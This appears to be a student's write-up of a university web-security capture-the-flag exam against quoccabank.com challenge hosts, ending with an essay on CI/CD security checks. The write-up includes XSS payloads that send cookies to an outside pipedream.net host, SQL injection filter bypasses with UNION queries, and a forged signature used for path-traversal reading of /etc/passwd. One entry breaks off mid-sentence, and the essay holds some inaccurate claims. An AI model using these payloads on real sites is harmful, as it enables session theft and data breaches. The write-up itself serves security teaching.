### Q1 - whereami.quoccabank.com (4 flags)

- COMP6843FINAL{GOOD_LUCK_WITH_YOUR_EXAM.ejUzMTI3OTk=.R1+RaySoxFjuhNzMu6C1Ew==}
  - check cookie -> cookie is encoded in base64
    - Q09NUDY4NDNGSU5BTHtHT09EX0xVQ0tfV0lUSF9ZT1VSX0VYQU0uZWpVek1USTNPVGs9LlIxK1JheVNveEZqdWhOek11NkMxRXc9PX0=
    - use cyber chef to decode cookie to get flag
- COMP6843FINAL{ROBOTS_ROBOTS_ROBOTS}
  - check robots.txt to get flag
- Recon:
  - inspecting the source code, theres a /test.php route
  - theres directories in robots.txt

### Q2 - secure-search-today.quoccabank.com (1 flag)

- COMP6843FINAL{REF_XSS_MORE_FILTERS_SIMPLE.ejUzMTI3OTk=.nsceOVn9zcJEm/1jYq2Q8g==}
  - waf againts script tags - using the payload `<image/src/onerror=location.href='https://enumy8vb0ua5f.x.pipedream.net/'+btoa(document.cookie)>` and report the page to get the cookie

### Q3 - secure-research-portal.quoccabank.com (1 flag)

- nonce value is base64 encoded integer value - the generation of the value is predictable as each time the page is reloaded, the nonce decoded value increments by 2

- Use the payload wth the next predicted nonce value and report the page

  ```
  <script nonce="MTAwMTgw">fetch('https://enumy8vb0ua5f.x.pipedream.net/'+btoa(document.cookie))</script>
  ```

### Q4 - qos.quoccabank.com (11 flags)

**QOS - Homepage & Login**: 3 flags and **QOS - Infra & Other Areas**: 3 flags

- COMP6843FINAL{CLOSED_SOURCE_SOFTWARE_DOES_NOT_EXIST.ejUzMTI3OTk=.dTY5DlwG0NQTwsPqA8/yPQ==}
  - Recon: check /qos.js - flag is at the end of the file.
  
- COMP6843FINAL{I_LOVE_LIVE_DEBUGGING.ejUzMTI3OTk=.Z/V6VS+AarrhaLsMZJHpuw==}
  - check robots.txt to reveal that there exists a /debug/pprof/ route
  - accessing /debug/pprof/ gives us a 403 error - which indicates permission error. If we inspect the cookies, there is a debug cookie set to 0. Set the debug cookie to 1 to reveal the flag on the page.
  
- COMP6843FINAL{STACK_TRACE_IS_MY_FRIEND.ejUzMTI3OTk=.cpKfTzD/peCHAl5NGeihTw==}
  - chaining from the previous flag, /debug/pprof gives us a bunch of hyperlinks. Inspecting /debug/pprof/goroutine?debug=1 (one of the hyperlinks displayed on the page) gives us this line `#	0x8fbecc	main.serve_qos_dot_quoccabank_dot_com_slash_lmaolmaolmaolmaolmaocybercybercyber+0x4c	challenges/final/qos/main.go:67`, indicating that this is a possible route on the website. If we access qos.quoccabank.com/lmaolmaolmaolmaolmaocybercybercyber, we can get the flag
  
- COMP6843FINAL{I_ALWAYS_PASS_SECRET_IN_CLI_ARGUMENT.ejUzMTI3OTk=.M0B8Qh7l9Ir/ZyOVScTxxA==}
  - we found the /admin route earlier when checking robots.txt
  - Loggin in: from /debug/pprof, there seems to be a link to debug/pprof/cmdline which displays the error msg `/app/challenges/final/qos/image.binary�-listen�0.0.0.0:80�-jwt_public_key�jwtkeys/jwt.pub�-secret_portal_password�what_could_possibly_go_wrong�-profile_renderer�challenges/final/qos/renderer�-profile_data�/data/profile/�-profile_render_timeout�2s`. Looking at the msg, it would seem that the potential password to the site is `what_could_possibly_go_wrong`
  - Enter `what_could_possibly_go_wrong` as the password to /admin to gain access to the flag
  
- COMP6843FINAL{WHY_SEND_THAT_API_REQUEST_WHEN_I_CAN_VERIFY_PASSWORD_ON_FRONTEND.ejUzMTI3OTk=.iFwCCI0y89I89a61hzjOnQ==}
  - seems like password is validated in the frontend. Inspecting /qos.js indicates to use breakpoints in chrome. Searching the js file, it seems it compares the password entered to an md5 hash. However, the hash is not easily searchable online.
  - As suggested by the hint to use breakpoints, set a breakpoint on the password comparision and change the variable to the hash to get the flag. Change variable `a` to '8f60992665ca6329da8bb3422b576de0'.
  
- COMP6843FINAL{CAN_WE_PORT_APP_STORE_TO_QOS_PLEASE.ejUzMTI3OTk=.VFNNbWzlJ6mJoa35RxhfHQ==}

  - inspecting the qos.js code, there appears to be this snippet:

    ```
    function Rd(a, b) {
        var c = Qd++
          , e = a.toLowerCase().replace(new RegExp(" ".replace(/([-()\[\]{}+?*.$\^|,:#<!\\])/g, "\\$1").replace(/\x08/g, "\\x08"),"g"), "".replace(/\$/g, "$$$$")) + ".png"
          , f = new Ec;
        Gc(f, e);
        Gc(f, "_this_is_my_secret_salt");
        f = Mb(Hc(f));
        return {
            id: c,
            name: a,
            image: "/api/getappimage?f=" + e + "&signature=" + f,
            Y: b
        }
    }
    ```

  - Seems like when accessing an image, it adds a signature to the url. This could lead to a local file inclusion vulnerability, which we can fetch files on the server (but we need a signature to do so).

  - We can simply call the function that the js used to create our own signature
  
    ```
    a = '../etc/passwd'
    e = a.toLowerCase().replace(new RegExp(" ".replace(/([-()\[\]{}+?*.$\^|,:#<!\\])/g, "\\$1").replace(/\x08/g, "\\x08"),"g"), "".replace(/\$/g, "$$$$"))
    f = new Ec;
    Gc(f, e);
    Gc(f, "_this_is_my_secret_salt");
    f = Mb(Hc(f));
    ```
  
  - Executing this in the browser gives us this hash 8842bdd7d41ade58715c424a8c428724
  
  - Access https://qos.quoccabank.com/api/getappimage?f=../etc/passwd&signature=8842bdd7d41ade58715c424a8c428724 to get the flag

**QOS - Handbook**: 1 flag

- COMP6843FINAL{0a89d110-05bd-4da0-a12d-not-a-fake-but-a-real-flag.ejUzMTI3OTk=.ZnyRCh//ibRNPuzWpwY60w==}
  - there exists a waf where the input is replaces spaces characters with NOSPACE. Searching online https://portswigger.net/support/sql-injection-bypassing-common-filters, it appears that we can use comments `/**/ `to bypass the space in queries. However, it appears that the WAF blocks /**/ and replaces it with /BADHACKER/. However, since `/**/` is a comment, we can put anything in it i.e. `/*anything*/` which bypasses the WAF to perform sqli.
  - `'/*j*/UNION/*j*/SELECT/*j*/table_name,table_schema/*j*/from/*j*/information_schema.tables/*j*/#/*j*/` to exfiltrate databases name. There seems to be a courses and memes table.
  - `'/*j*/UNION/*j*/SELECT/*j*/table_name,column_name/*j*/from/*j*/information_schema.columns/*j*/#/*j*/`
  - `'/*j*/UNION/*j*/SELECT/*j*/table_name,column_name/*j*/from/*j*/information_schema.columns/*j*/#/*j*/` to extract column names. There appears to be a meme column for the memes table.
  - `'/*j*/UNION/*j*/SELECT/*j*/1,meme/*j*/from/*j*/memes/*j*/#/*j*/` to extract contents of the memes table which contains th

**QOS - Tic-Tac-Toe**: 4 flags

- testing the game, it seems to play the game without making fetch requests but instead locally. Lets inspect what the code does when making a move. Look in the js file where it prints "making move x, x" to know which code makes the decision.
- Inspecting the code, it sends a move with an x and y position. If we edit the values, it displays an error message in the console  that reveals the source code `stack trace is hard so here's the source code: // rip mdn (https://twitter.com/SteveALee/status/1293487542382333952)
  // did you know proto? i heard you can even inject them https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto`. Looking the code given the flags are revealed if:
  - win with less than 5 steps, how is this even possible
  - win with less than 3 steps, how is this even possible
  - weird this config function is still under development how did you set it? anyway here's a flag:
- COMP6843FINAL{I_THOUGHT_ITS_MY_TERN_BUT_OK.ejUzMTI3OTk=.wFXBFeprBfbMoXY/T+0s4g==}
  - change the b variable to play as player X each time by setting a breakpoint before sending the move

### Q5

**Q5. You are working for a software development company building a market leading machine dog translation package. The software accepts audio inputs of dogs barking, and translates it to a suite of 12 common human languages. To achieve this, their main product is coded in Java and distributed to customers as Docker images. The code is stored in a private github repository, with a commit hook that triggers a Jenkins CI/CD build pipeline. The build pipeline performs a wide range of performance, functionality, and security tests. If all these pass, a fresh Docker image with a complete build is automatically produced. If they fail, a failure report is produced.**

**a) Describe all of the automated security checks that you would put in the CI/CD pipeline. Be as specific as possible about technologies and how they will function to pass/fail builds.**

Although not part of the CI/CD pipeline, it is important for developers to be well trained in writing secure code. This includes training developers to fix vulnerabilities in a snippet of code or training them with an attacker mindsent in mind so that developers can identify which part of the code is vulnerable.

We can use Maven for compiled JARs as dependencies which makes it easier to identify dependencies. For this Java application, products such as JBoss can be integrated in the CI/CD pipeline. JBoss can collate and unpack all product builds to generate a database of JARs for the application, and match it against known vulnerable JARs. This can be integrated at the start of the CI/CD pipeline during build time.


With the CI/CD pipeline, it is important to perform a software composition anaylsis which is the inspection of metadata of software packages, in this case the packages of the Java application, and compare it to a database such as the NVD and pull the CPE data to identify known vulnerabilities present in the application. This is an imperative security check and essential in the CI/CD pipeline as it can catch zero day vulnerabilities in the dependency tree. Integrating it in the pipeline allows the CI process to fail builds being deployed to Jenkins when there exists a vulnerability and it can also send alerts to developers which enables dectection of potential security threats.

Source code analysis is anpther important security check to perform in the pipeline. Integrating SCA can reveal errors throughout deployment rather at the end of the development lifecycle. 

The CI/CD pipeline can also perform security testing, whereby it is static or dynamic. Static application testing analyse the source code to find vulnerabilities whilst dynamic testing can perform black-box security testing in which tests are performed by attacking an application from the outside. Integrating such testing in the CI/CD pipeline ensures that vulnerabilities are fixed at an early stage as well.

Integrating security checks in CI/CD pipeline can be used to automate DevSecOps practices. With such security threats in the pipeline, if the Java application is pushed push to staging enviroment in the pipeline, these security checks can determine if vulnerabilities exists. If so, the CI/CD pipeline can fail the build, generate reports to which areas to fix and alert the stackholders involved.

**b) Describe the weaknesses in these checks, i.e. how they could produce false positives and negatives.**

For example, checking packages to know vulnerable packages (i.e through software composition analysis or products such as JBoss) can result in some false positives and negatives. For instance metadata that is present in these database can have a different reference or be bundled different. This specifically applies to Java application as for example, the Spring Boot has been repackaged several times that there exists variations of the same packages (which could be vulnerable). Thus, leading to false negative when checking the dependencies for vulnerabilities.